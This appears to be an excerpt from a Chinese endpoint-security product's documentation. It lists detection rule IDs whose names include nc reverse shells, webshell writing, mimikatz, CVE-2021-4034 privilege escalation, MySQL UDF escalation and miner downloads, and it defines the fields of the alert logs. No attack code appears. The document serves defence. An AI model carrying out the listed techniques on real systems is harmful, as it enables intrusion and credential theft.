+00F200E5 | 15859941 | 致远 OA 文件上传漏洞利用
+00F200E6 | 15859942 | 通达 OA 文件上传漏洞利用
+00F200E7 | 15859943 | 利用 mysql 数据库服务上传 web 脚本文件
+00F200E8 | 15859944 | 利用 mysql 数据库服务执行敏感命令
+00F200E9 | 15859945 | 利用 mysql 数据库服务进行 udF 提权
+00F200EA | 15859946 | 利用 sqlserver 数据库服务上传 web 脚本文件
+00F200EB | 15859947 | 利用 Oracle 数据库服务上传 web 脚本文件
+00F200EC | 15859948 | Sudo 缓冲区栈溢出本地提权漏洞利用
+00F200ED | 15859949 | 使用 MiniDump API dump 进程内存
+00F200EE | 15859950 | 使用 esentutl 命令拷贝系统账户相关文件
+00F200EF | 15859951 | 挪移系统文件
+00F200F0 | 15859952 | DNS 带外查询
+00F200F1 | 15859953 | HTTP 带外查询
+00F200F2 | 15859954 | HTTP 带外查询 2
+00F200F3 | 15859955 | 哥斯拉执行命令
+00F200F4 | 15859956 | 疑似 webshell 执行命令
+00F200F5 | 15859957 | 写入一句话 webshell
+00F200F6 | 15859958 | nc 反弹 shell
+00F200F7 | 15859959 | 恶意后门通信
+00F200F8 | 15859960 | 隐藏后门文件通信
+00F200F9 | 15859961 | 恶意后门通信 2
+00F200FA | 15859962 | 恶意文件启动
+00F200FB | 15859963 | 应用目录下可疑文件启动
+00F200FC | 15859964 | 可疑文件启动
+00F200FD | 15859965 | 可疑脚本文件执行
+00F200FE | 15859966 | 挖矿程序启动
+00F200FF | 15859967 | 挖矿程序启动 2
+00F20100 | 15859968 | 挖矿病毒下载行为
+00F20101 | 15859969 | Linux 计划任务执行异常命令
+00F20102 | 15859970 | Linux 执行恶意下载命令
+00F20103 | 15859971 | 恶意文件创建
+00F20104 | 15859972 | 恶意文件创建 2
+00F20105 | 15859973 | 下载 github 上的提权代码
+
+=== TABLE ===
+00F20106 | 15859974 | 下载 github 上的提权代码 2
+00F20107 | 15859975 | 利用 mysql 数据库服务进行 udF 提权 2
+00F20108 | 15859976 | Linux 提权漏洞利用(CVE-2021-4034)
+00F20109 | 15859977 | 通过 mount /proc 目录隐藏进程
+00F2010A | 15859978 | 挖矿病毒文件创建
+00F2010B | 15859979 | 挖矿程序启动
+00F2010C | 15859980 | 双脉冲星(DoublePulsar)攻击程序
+00F2010D | 15859981 | 使用黑客工具 mimikatz
+00F2010E | 15859982 | 伪装成系统文件启动
+00F2010F | 15859983 | 恶意文件启动
+00F20110 | 15859984 | 永恒之蓝病毒文件启动
+00F20111 | 15859985 | 可疑文件启动
+00F20112 | 15859986 | 使用常用黑客工具
+00F20113 | 15859987 | 使用漏洞利用程序
+00F20114 | 15859988 | 使用端口扫描工具
+00F20115 | 15859989 | 使用暴力破解工具
+00F20116 | 15859990 | 恶意文件创建
+00F20117 | 15859991 | 虚假系统文件创建
+00F20118 | 15859992 | 恶意脚本执行
+00F20119 | 15859993 | 恶意脚本执行
+00F2011A | 15859994 | lsass.exe 执行系统命令
+00F2011B | 15859995 | 数据库服务执行可疑写入命令
+00F2011C | 15859996 | Web 服务执行危险持久化操作
+00F2011D | 15859997 | 数据库服务执行危险持久化操作
+00F2011E | 15859998 | 添加可疑计划任务
+00F2011F | 15859999 | 异常扩展名文件启动
+00F20120 | 15860000 | 蚁剑 AntSword 执行命令
+00F20121 | 15860001 | 疑似 webshell 执行命令
+00F20122 | 15860002 | Linux 创建恶意驱动模块
+00F20123 | 15860003 | 使用代理软件 lcx
+00F20124 | 15860004 | 驱动人生病毒
+00F20125 | 15860005 | 柠檬鸭病毒
+00F20126 | 15860006 | 通达 OA 文件上传漏洞利用
+00F60004 | 16121860 | IPS虚拟补丁
+
+=== TABLE ===
+一级 | 字段描述
+accuracy | 告警精准度（1 可疑，2 告警）
+attackIp | 攻击 ip
+attackIpAddress | 攻击 ip 地址范围
+attackIpFlag | 攻击 ip 标记
+attackType | 攻击类型
+bannedStatus | 禁用状态
+categoryName | 分类名描述
+categoryUuid | 分类 Uuid
+day | 安装时间
+
+dealStatus | 处理状态，0-未处置，1-已处置（自动） ，2-已处置（手动），3-已处置（误报），4-已处置（不关注）， 5-处置失败，6-处置中
+dealSuggestion | 处理建议
+dealTime | 处理时间
+description | 描述
+direction | 网络方向(1.入站 2.出站）
+domain | 域名
+enterprise | 企业
+eventId | 事件 id（十进制）
+eventUuid | 事件 id（十六进制）
+fullTree | 详细进程树
+groupName | 分组名称
+innerIp | 内网 ip
+ip | 攻击 ip
+ipAddress | 攻击 ip 归属信息
+levelDesc | 事件级别
+localTimestamp | agent 本地时间戳
+loginUser | 登录用户名
+logo | 产品标识
+machineUuid | 服务器 uuid
+
+=== TABLE ===
+outerIp | 外部 ip
+phase | 攻击阶段 0-其它，1-探测，2-攻击，3-控制
+phaseDesc | 攻击阶段描述
+primarySource | 风险来源
+processingMethod | 处置类型
+result | 防护状态，0-拦截，1-未拦截
+risk | 事件风险级别，0-可疑，1-告警
+ruleDesc | 规则描述
+ruleId | 规则 id
+ruleName | 规则名称
+score | 风险评分
+serviceId | 服务 ID
+source | 来源
+secondarySource | 二级来源
+sourceDesc | 来源描述
+standardTimestamp | 标准时间戳
+threatSource | 威胁来源
+threatType | 威胁类型
+treePath | 进程树
+typeName | 类型名称
+ucrc | 日志唯一值
+victimIpFlag | 受害 ip 标记
+
+=== TABLE ===
+一级 | 二级 | 字段描述
+
+action | alarmText | 告警描述
+
+action | html | 告警 heml 描述
+
+action | text | 告警描述
+alarmMsg |  | 报警信息
+
+=== TABLE ===
+一级 | 二级 | 字段描述
+
+
+sourceIpAddress | city | 城市
+
+
+sourceIpAddress | country | 国家
+
+
+sourceIpAddress | Ip | Ip
+
+
+sourceIpAddress | region | 省份
+
+
+sourceIpAddress | Type | 网络类型
+
+=== TABLE ===
+一级 | 二级 | 字段描述
+
+
+
+
+
+machine | extranetIp | 外网 ip
+
+
+
+
+
+machine | installTime | 安装时间
+
+
+
+
+
+machine | intranetIp | 内网 ip
+
+
+
+
+
+machine | ipv4 | Ipv4
+
+
+
+
+
+machine | ipv6 | ipv6
+
+
+
+
+
+machine | machineName | 服务器名称
+
+
+
+
+
+machine | onlineStatus | 在线离线状态
+
+
+
+
+
+machine | operatingSystem | 操作系统
+
+
+
+
+
+machine | osType | 服务器类型，0-win ，1-linux
+
+
+
+
+
+machine | uuid | 服务器 uuid
+
+=== TABLE ===
+一级 | 二级 | 字段描述
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | bVerify | 确认标记
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | company | 进程公司描述
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | pcmd | 进程命令行
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | pid | 进程 id
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | ppid | 父进程 id
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | group | 所属组
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | io | io
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | path | 进程路径
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | ppath | 父进程路径
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | ppcmd | 父进程命令行
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | autoLock | 自动锁
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | fileHash | 文件 hash
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | pprocess | 父进程路径
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | ppuser | 父进程用户
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | procHash | 进程 hash
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | procUuid | 进程 uuid
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | process | 进程路径
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | type | 类型
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | user | 用户
+
+
+
+
+
+
+
+
+
+
+
+
+
+subject | webPagePhysicalPat h | web 路径
+
+=== TABLE ===
+一级 | 字段描述
+operation | 操作
+operationDesc | 操作描述
+operationExtra | 操作额外信息
+
+=== TABLE ===
+一级 | 二级 | 字段描述
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | domain | 域名信息
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | url | url
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | ip | ip
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | path | 路径
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | port | 端口
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | cmdline | 命令行
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | pid | 进程 id
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | process | 进程路径
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | createTime | 创建时间
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | dir | 路径
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | eventDesc | 事件描述
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | file | 文件路径
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | fileHash | 文件 hash
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | fileType | 文件类型
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | fromType | 来源类型
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | latest | 最近时间
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | proc | 进程名
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | size | 大小
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | isInternalIp | 是否内部 ip
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | isWhiteListHit | 是否命中白名单
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | isWhiteListOn | 白名单打开标记
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | userName | 用户名称
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | user | 用户
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | virusFileId | 病毒文件 ID
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | virusName | 病毒名
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | command | 命令行
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | hookPoint | hook 点
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | scriptData | 脚本数据
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | scriptPath | 脚本路径
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+object | other | 其它
+
+=== TABLE ===
+一级 | 字段描述
+attId | ATT&CK_id
+tactic | ATT&CK 策略
+tactics | 同 tactic 取哪个都可以
+
+=== TABLE ===
+一级 | 二级 | 字段描述
+
+
+
+
+ruleInfo | risk | 规则准确度
+
+
+
+
+ruleInfo | ruleDesc | 规则描述
+
+
+
+
+ruleInfo | ruleId | 规则 id
+
+
+
+
+ruleInfo | ruleLevel | 规则等级
+
+
+
+
+ruleInfo | ruleType | 规则类型
+
+
+
+
+ruleInfo | ruleName | 规则名称
+
+
+
+
+ruleInfo | backdoorType | 后门类型
+
+
+
+
+ruleInfo | backdoorTypeName | 后面类型名称
+
+=== TABLE ===
+一级 | 二级 | 字段描述
+
+
+
+
+
+
+
+backdoor | file | 文件路径
+
+
+
+
+
+
+
+backdoor | fileAuth | 文件权限
+
+
+
+
+
+
+
+backdoor | fileCreateTime | 文件创建时间
+
+
+
+
+
+
+
+backdoor | fileGroup | 文件所属组
+
+
+
+
+
+
+
+backdoor | fileHash2 | 文件 Hash
+
+
+
+
+
+
+
+backdoor | fileMd5 | 文件 md5 值
+
+
+
+
+
+
+
+backdoor | fileModifyTime | 文件修改时间
+
+
+
+
+
+
+
+backdoor | fileSize | 文件大小
+
+
+
+
+
+
+
+backdoor | fileType | 文件类型
+
+
+
+
+
+
+
+backdoor | fileUseTime | 文件使用时间
+
+
+
+
+
+
+
+backdoor | fileUser | 文件所有用户
+
+
+
+
+
+
+
+backdoor | judgeFrom | 来源
+
+=== TABLE ===
+一级 | 二级 | 字段描述
+
+
+
+
+
+
+
+
+extension | dataFrom | 数据来源
+
+
+
+
+
+
+
+
+extension | fileATime | 文件访问时间
+
+
+
+
+
+
+
+
+extension | fileAccess | 文件权限
+
+
+
+
+
+
+
+
+extension | fileCTime | 文件创建时间
+
+
+
+
+
+
+
+
+extension | fileHash | 文件 hash
+
+
+
+
+
+
+
+
+extension | fileMTime | 文件修改时间
+
+
+
+
+
+
+
+
+extension | fileMd5 | 文件 md5 值
+
+
+
+
+
+
+
+
+extension | fileSize | 文件大小
+
+
+
+
+
+
+
+
+extension | fileType | 文件类型
+
+
+
+
+
+
+
+
+extension | fileUser | 文件用户
+
+
+
+
+
+
+
+
+extension | fileUserGroup | 文件用户组
+
+
+
+
+
+
+
+
+extension | isUpload | 文件上传标记
+
+
+
+
+
+
+
+
+extension | hash | 文件 hash
+
+
+
+
+
+
+
+
+extension | scriptDumpPath | 脚本 dump 本例路径
+
+=== TABLE ===
+一级 | 二级 | 字段描述
+
+
+rce | desc | rce 描述
+
+
+rce | id | rceid
+
+
+rce | name | rce 名称
+
+
+rce | risk | rce 风险级别
+
+
+rce | svcname | 服务名
+
+=== TABLE ===
+一级 | 二级 | 字段描述
+
+
+
+
+
+http | cookie | cookie 信息
+
+
+
+
+
+http | domain | domain 信息
+
+
+
+
+
+http | host | host 信息
+
+
+
+
+
+http | method | 方法名
+
+
+
+
+
+http | proxy_ip | 代理 ip
+
+
+
+
+
+http | queryString | 查询字符串
+
+
+
+
+
+http | referer | referer 信息
+
+
+
+
+
+http | regexMatch | 正则匹配
+
+
+
+
+
+http | reserve1 | 扩展
+
+=== TABLE ===
+ | ruleDesc | 规则描述
+ | 
+
+
+
+
+type | 攻击类型 2-畸形文件，3-文件解析漏洞，4-防盗链，5-防多线程下载， 6-防应用程序漏洞，7-防溢出，8-防SQL 注入，9-防 XSS 攻击，10-防文件下载，11-防非法请求，12-敏感词过滤，13-后台防护，15-网络通信， 19-网页浏览实时防护，20-HTTP 请求防护
+ | url | url
+ | userAgent | 请求的 userAgent 信息
+ | x_forwarded | 请求的 x_forwarded 信息
+
+=== TABLE ===
+一级 | 二级 | 字段描述
+
+
+
+webshell | desc | webshell 描述
+
+
+
+webshell | disposeStatus | 处理状态
+
+
+
+webshell | disposeStatusDesc | 处理状态描述
+
+
+
+webshell | file | 文件路径
+
+
+
+webshell | fileAuth | 文件权限
+
+
+
+webshell | fileCreateTime | 文件创建时间
+
+=== TABLE ===
+ | fileGroup | 文件组
+ | fileHash | 文件 hash 值
+ | fileMd5 | 文件 md5 值
+ | fileModifyTime | 文件修改时间
+ | fileSize | 文件大小
+ | fileUseTime | 文件使用时间
+ | fileUser | 所属用户
+ | ip | ipv4 地址
+ | judgeFrom | 数据来源
+ | judgeFromDesc | 数据来源描述
+ | riskLevel | 危险等级
+ | riskLevelDesc | 危险等级描述
+ | webshellType | webshell 类型
+
+=== TABLE ===
+一级 | 二级 | 字段描述
+login | loginUser | 登录账号名
+login | pcName | pc 名称
